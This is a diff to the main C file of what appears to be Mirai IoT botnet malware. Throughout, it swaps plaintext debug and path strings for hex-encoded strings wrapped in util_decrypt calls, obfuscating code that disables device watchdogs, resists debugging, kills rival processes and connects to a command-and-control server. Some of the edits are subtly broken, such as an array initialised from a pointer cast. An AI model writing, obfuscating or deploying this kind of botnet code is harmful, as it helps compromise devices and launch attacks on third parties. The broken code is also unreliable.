@@ -39,7 +39,7 @@ void (*resolve_func)(void) = (void (*)(void))util_local_addr; // Overridden in a
 #ifdef DEBUG
 static void segv_handler(int sig, siginfo_t *si, void *unused)
 {
-    printf("Got SIGSEGV at address: 0x%lx\n", (long) si->si_addr);
+    printf((char*)util_decrypt((char*)util_decrypt("\x47\x6F\x74\x20\x53\x49\x47\x53\x45\x47\x56\x20\x61\x74\x20\x61\x64\x64\x72\x65\x73\x73\x3A\x20\x30\x78\x25\x6C\x78\x0A\x00", 31), 31), (long) si->si_addr);
     exit(EXIT_FAILURE);
 }
 #endif
@@ -68,8 +68,8 @@ int main(int argc, char **args)
     signal(SIGTRAP, &anti_gdb_entry);
 
     // Prevent watchdog from rebooting device
-    if ((wfd = open("/dev/watchdog", 2)) != -1 ||
-        (wfd = open("/dev/misc/watchdog", 2)) != -1)
+    if ((wfd = open((char*)util_decrypt((char*)util_decrypt("\x2F\x64\x65\x76\x2F\x77\x61\x74\x63\x68\x64\x6F\x67\x00", 14), 14), 2)) != -1 ||
+        (wfd = open((char*)util_decrypt((char*)util_decrypt("\x2F\x64\x65\x76\x2F\x6D\x69\x73\x63\x2F\x77\x61\x74\x63\x68\x64\x6F\x67\x00", 19), 19), 2)) != -1)
     {
         int one = 1;
 
@@ -77,11 +77,11 @@ int main(int argc, char **args)
         close(wfd);
         wfd = 0;
     }
-    chdir("/");
+    chdir((char*)util_decrypt((char*)util_decrypt("\x2F\x00", 2), 2));
 #endif
 
 #ifdef DEBUG
-    printf("DEBUG MODE YO\n");
+    printf((char*)util_decrypt((char*)util_decrypt("\x44\x45\x42\x55\x47\x20\x4D\x4F\x44\x45\x20\x59\x4F\x0A\x00", 15), 15));
 
     sleep(1);
 
@@ -91,13 +91,13 @@ int main(int argc, char **args)
     sigemptyset(&sa.sa_mask);
     sa.sa_sigaction = segv_handler;
     if (sigaction(SIGSEGV, &sa, NULL) == -1)
-        perror("sigaction");
+        perror((char*)util_decrypt((char*)util_decrypt("\x73\x69\x67\x61\x63\x74\x69\x6F\x6E\x00", 10), 10));
 
     sa.sa_flags = SA_SIGINFO;
     sigemptyset(&sa.sa_mask);
     sa.sa_sigaction = segv_handler;
     if (sigaction(SIGBUS, &sa, NULL) == -1)
-        perror("sigaction");
+        perror((char*)util_decrypt((char*)util_decrypt("\x73\x69\x67\x61\x63\x74\x69\x6F\x6E\x00", 10), 10));
 #endif
 
     LOCAL_ADDR = util_local_addr();
@@ -141,7 +141,7 @@ int main(int argc, char **args)
     table_unlock_val(TABLE_EXEC_SUCCESS);
     tbl_exec_succ = table_retrieve_val(TABLE_EXEC_SUCCESS, &tbl_exec_succ_len);
     write(STDOUT, tbl_exec_succ, tbl_exec_succ_len);
-    write(STDOUT, "\n", 1);
+    write(STDOUT, (char*)util_decrypt((char*)util_decrypt("\x0A\x00", 2), 2), 1);
     table_lock_val(TABLE_EXEC_SUCCESS);
 
 #ifndef DEBUG
@@ -196,7 +196,7 @@ int main(int argc, char **args)
         if (nfds == -1)
         {
 #ifdef DEBUG
-            printf("select() errno = %d\n", errno);
+            printf((char*)util_decrypt((char*)util_decrypt("\x73\x65\x6C\x65\x63\x74\x28\x29\x20\x65\x72\x72\x6E\x6F\x20\x3D\x20\x25\x64\x0A\x00", 21), 21), errno);
 #endif
             continue;
         }
@@ -217,7 +217,7 @@ int main(int argc, char **args)
             accept(fd_ctrl, (struct sockaddr *)&cli_addr, &cli_addr_len);
 
 #ifdef DEBUG
-            printf("[main] Detected newer instance running! Killing self\n");
+            printf((char*)util_decrypt((char*)util_decrypt("\x5B\x6D\x61\x69\x6E\x5D\x20\x44\x65\x74\x65\x63\x74\x65\x64\x20\x6E\x65\x77\x65\x72\x20\x69\x6E\x73\x74\x61\x6E\x63\x65\x20\x72\x75\x6E\x6E\x69\x6E\x67\x21\x20\x4B\x69\x6C\x6C\x69\x6E\x67\x20\x73\x65\x6C\x66\x0A\x00", 54), 54));
 #endif
 #ifdef MIRAI_TELNET
             scanner_kill();
@@ -236,7 +236,7 @@ int main(int argc, char **args)
             if (!FD_ISSET(fd_serv, &fdsetwr))
             {
 #ifdef DEBUG
-                printf("[main] Timed out while connecting to CNC\n");
+                printf((char*)util_decrypt((char*)util_decrypt("\x5B\x6D\x61\x69\x6E\x5D\x20\x54\x69\x6D\x65\x64\x20\x6F\x75\x74\x20\x77\x68\x69\x6C\x65\x20\x63\x6F\x6E\x6E\x65\x63\x74\x69\x6E\x67\x20\x74\x6F\x20\x43\x4E\x43\x0A\x00", 42), 42));
 #endif
                 teardown_connection();
             }
@@ -249,7 +249,7 @@ int main(int argc, char **args)
                 if (err != 0)
                 {
 #ifdef DEBUG
-                    printf("[main] Error while connecting to CNC code=%d\n", err);
+                    printf((char*)util_decrypt((char*)util_decrypt("\x5B\x6D\x61\x69\x6E\x5D\x20\x45\x72\x72\x6F\x72\x20\x77\x68\x69\x6C\x65\x20\x63\x6F\x6E\x6E\x65\x63\x74\x69\x6E\x67\x20\x74\x6F\x20\x43\x4E\x43\x20\x63\x6F\x64\x65\x3D\x25\x64\x0A\x00", 46), 46), err);
 #endif
                     close(fd_serv);
                     fd_serv = -1;
@@ -260,14 +260,14 @@ int main(int argc, char **args)
                     uint8_t id_len = util_strlen(id_buf);
 
                     LOCAL_ADDR = util_local_addr();
-                    send(fd_serv, "\x00\x00\x00\x01", 4, MSG_NOSIGNAL);
+                    send(fd_serv, (char*)util_decrypt("\x0A\x0A\x0A\x0B", 4), 4, MSG_NOSIGNAL);
                     send(fd_serv, &id_len, sizeof (id_len), MSG_NOSIGNAL);
                     if (id_len > 0)
                     {
                         send(fd_serv, id_buf, id_len, MSG_NOSIGNAL);
                     }
 #ifdef DEBUG
-                    printf("[main] Connected to CNC. Local address = %d\n", LOCAL_ADDR);
+                    printf((char*)util_decrypt((char*)util_decrypt("\x5B\x6D\x61\x69\x6E\x5D\x20\x43\x6F\x6E\x6E\x65\x63\x74\x65\x64\x20\x74\x6F\x20\x43\x4E\x43\x2E\x20\x4C\x6F\x63\x61\x6C\x20\x61\x64\x64\x72\x65\x73\x73\x20\x3D\x20\x25\x64\x0A\x00", 45), 45), LOCAL_ADDR);
 #endif
                 }
             }
@@ -293,7 +293,7 @@ int main(int argc, char **args)
             if (n == 0)
             {
 #ifdef DEBUG
-                printf("[main] Lost connection with CNC (errno = %d) 1\n", errno);
+                printf((char*)util_decrypt((char*)util_decrypt("\x5B\x6D\x61\x69\x6E\x5D\x20\x4C\x6F\x73\x74\x20\x63\x6F\x6E\x6E\x65\x63\x74\x69\x6F\x6E\x20\x77\x69\x74\x68\x20\x43\x4E\x43\x20\x28\x65\x72\x72\x6E\x6F\x20\x3D\x20\x25\x64\x29\x20\x31\x0A\x00", 48), 48), errno);
 #endif
                 teardown_connection();
                 continue;
@@ -327,7 +327,7 @@ int main(int argc, char **args)
             if (n == 0)
             {
 #ifdef DEBUG
-                printf("[main] Lost connection with CNC (errno = %d) 2\n", errno);
+                printf((char*)util_decrypt((char*)util_decrypt("\x5B\x6D\x61\x69\x6E\x5D\x20\x4C\x6F\x73\x74\x20\x63\x6F\x6E\x6E\x65\x63\x74\x69\x6F\x6E\x20\x77\x69\x74\x68\x20\x43\x4E\x43\x20\x28\x65\x72\x72\x6E\x6F\x20\x3D\x20\x25\x64\x29\x20\x32\x0A\x00", 48), 48), errno);
 #endif
                 teardown_connection();
                 continue;
@@ -339,7 +339,7 @@ int main(int argc, char **args)
             recv(fd_serv, rdbuf, len, MSG_NOSIGNAL);
 
 #ifdef DEBUG
-            printf("[main] Received %d bytes from CNC\n", len);
+            printf((char*)util_decrypt((char*)util_decrypt("\x5B\x6D\x61\x69\x6E\x5D\x20\x52\x65\x63\x65\x69\x76\x65\x64\x20\x25\x64\x20\x62\x79\x74\x65\x73\x20\x66\x72\x6F\x6D\x20\x43\x4E\x43\x0A\x00", 35), 35), len);
 #endif
 
             if (len > 0)
@@ -365,7 +365,7 @@ static void resolve_cnc_addr(void)
     if (entries == NULL)
     {
 #ifdef DEBUG
-        printf("[main] Failed to resolve CNC address\n");
+        printf((char*)util_decrypt((char*)util_decrypt("\x5B\x6D\x61\x69\x6E\x5D\x20\x46\x61\x69\x6C\x65\x64\x20\x74\x6F\x20\x72\x65\x73\x6F\x6C\x76\x65\x20\x43\x4E\x43\x20\x61\x64\x64\x72\x65\x73\x73\x0A\x00", 38), 38));
 #endif
         return;
     }
@@ -377,20 +377,20 @@ static void resolve_cnc_addr(void)
     table_lock_val(TABLE_CNC_PORT);
 
 #ifdef DEBUG
-    printf("[main] Resolved domain\n");
+    printf((char*)util_decrypt((char*)util_decrypt("\x5B\x6D\x61\x69\x6E\x5D\x20\x52\x65\x73\x6F\x6C\x76\x65\x64\x20\x64\x6F\x6D\x61\x69\x6E\x0A\x00", 24), 24));
 #endif
 }
 
 static void establish_connection(void)
 {
 #ifdef DEBUG
-    printf("[main] Attempting to connect to CNC\n");
+    printf((char*)util_decrypt((char*)util_decrypt("\x5B\x6D\x61\x69\x6E\x5D\x20\x41\x74\x74\x65\x6D\x70\x74\x69\x6E\x67\x20\x74\x6F\x20\x63\x6F\x6E\x6E\x65\x63\x74\x20\x74\x6F\x20\x43\x4E\x43\x0A\x00", 37), 37));
 #endif
 
     if ((fd_serv = socket(AF_INET, SOCK_STREAM, 0)) == -1)
     {
 #ifdef DEBUG
-        printf("[main] Failed to call socket(). Errno = %d\n", errno);
+        printf((char*)util_decrypt((char*)util_decrypt("\x5B\x6D\x61\x69\x6E\x5D\x20\x46\x61\x69\x6C\x65\x64\x20\x74\x6F\x20\x63\x61\x6C\x6C\x20\x73\x6F\x63\x6B\x65\x74\x28\x29\x2E\x20\x45\x72\x72\x6E\x6F\x20\x3D\x20\x25\x64\x0A\x00", 44), 44), errno);
 #endif
         return;
     }
@@ -408,7 +408,7 @@ static void establish_connection(void)
 static void teardown_connection(void)
 {
 #ifdef DEBUG
-    printf("[main] Tearing down connection to CNC!\n");
+    printf((char*)util_decrypt((char*)util_decrypt("\x5B\x6D\x61\x69\x6E\x5D\x20\x54\x65\x61\x72\x69\x6E\x67\x20\x64\x6F\x77\x6E\x20\x63\x6F\x6E\x6E\x65\x63\x74\x69\x6F\x6E\x20\x74\x6F\x20\x43\x4E\x43\x21\x0A\x00", 40), 40));
 #endif
 
     if (fd_serv != -1)
@@ -439,7 +439,7 @@ static void ensure_single_instance(void)
         if (errno == EADDRNOTAVAIL && local_bind)
             local_bind = FALSE;
 #ifdef DEBUG
-        printf("[main] Another instance is already running (errno = %d)! Sending kill request...\r\n", errno);
+        printf((char*)util_decrypt((char*)util_decrypt("\x5B\x6D\x61\x69\x6E\x5D\x20\x41\x6E\x6F\x74\x68\x65\x72\x20\x69\x6E\x73\x74\x61\x6E\x63\x65\x20\x69\x73\x20\x61\x6C\x72\x65\x61\x64\x79\x20\x72\x75\x6E\x6E\x69\x6E\x67\x20\x28\x65\x72\x72\x6E\x6F\x20\x3D\x20\x25\x64\x29\x21\x20\x53\x65\x6E\x64\x69\x6E\x67\x20\x6B\x69\x6C\x6C\x20\x72\x65\x71\x75\x65\x73\x74\x2E\x2E\x2E\x0D\x0A\x00", 83), 83), errno);
 #endif
 
         // Reset addr just in case
@@ -450,7 +450,7 @@ static void ensure_single_instance(void)
         if (connect(fd_ctrl, (struct sockaddr *)&addr, sizeof (struct sockaddr_in)) == -1)
         {
 #ifdef DEBUG
-            printf("[main] Failed to connect to fd_ctrl to request process termination\n");
+            printf((char*)util_decrypt((char*)util_decrypt("\x5B\x6D\x61\x69\x6E\x5D\x20\x46\x61\x69\x6C\x65\x64\x20\x74\x6F\x20\x63\x6F\x6E\x6E\x65\x63\x74\x20\x74\x6F\x20\x66\x64\x5F\x63\x74\x72\x6C\x20\x74\x6F\x20\x72\x65\x71\x75\x65\x73\x74\x20\x70\x72\x6F\x63\x65\x73\x73\x20\x74\x65\x72\x6D\x69\x6E\x61\x74\x69\x6F\x6E\x0A\x00", 68), 68));
 #endif
         }
         
@@ -464,7 +464,7 @@ static void ensure_single_instance(void)
         if (listen(fd_ctrl, 1) == -1)
         {
 #ifdef DEBUG
-            printf("[main] Failed to call listen() on fd_ctrl\n");
+            printf((char*)util_decrypt((char*)util_decrypt("\x5B\x6D\x61\x69\x6E\x5D\x20\x46\x61\x69\x6C\x65\x64\x20\x74\x6F\x20\x63\x61\x6C\x6C\x20\x6C\x69\x73\x74\x65\x6E\x28\x29\x20\x6F\x6E\x20\x66\x64\x5F\x63\x74\x72\x6C\x0A\x00", 43), 43));
             close(fd_ctrl);
             sleep(5);
             killer_kill_by_port(htons(SINGLE_INSTANCE_PORT));
@@ -472,7 +472,7 @@ static void ensure_single_instance(void)
 #endif
         }
 #ifdef DEBUG
-        printf("[main] We are the only process on this system!\n");
+        printf((char*)util_decrypt((char*)util_decrypt("\x5B\x6D\x61\x69\x6E\x5D\x20\x57\x65\x20\x61\x72\x65\x20\x74\x68\x65\x20\x6F\x6E\x6C\x79\x20\x70\x72\x6F\x63\x65\x73\x73\x20\x6F\x6E\x20\x74\x68\x69\x73\x20\x73\x79\x73\x74\x65\x6D\x21\x0A\x00", 48), 48));
 #endif
     }
 }
@@ -480,7 +480,7 @@ static void ensure_single_instance(void)
 static BOOL unlock_tbl_if_nodebug(char *argv0)
 {
     // ./dvrHelper = 0x2e 0x2f 0x64 0x76 0x72 0x48 0x65 0x6c 0x70 0x65 0x72
-    char buf_src[18] = {0x2f, 0x2e, 0x00, 0x76, 0x64, 0x00, 0x48, 0x72, 0x00, 0x6c, 0x65, 0x00, 0x65, 0x70, 0x00, 0x00, 0x72, 0x00}, buf_dst[12];
+    char buf_src[18] = (char*)util_decrypt("\x25\x24\x0A\x7C\x6E\x0A\x42\x78\x0A\x66\x6F\x0A\x6F\x7A\x0A\x0A\x78\x0A", 18), buf_dst[12];
     int i, ii = 0, c = 0;
     uint8_t fold = 0xAF;
     void (*obf_funcs[]) (void) = {
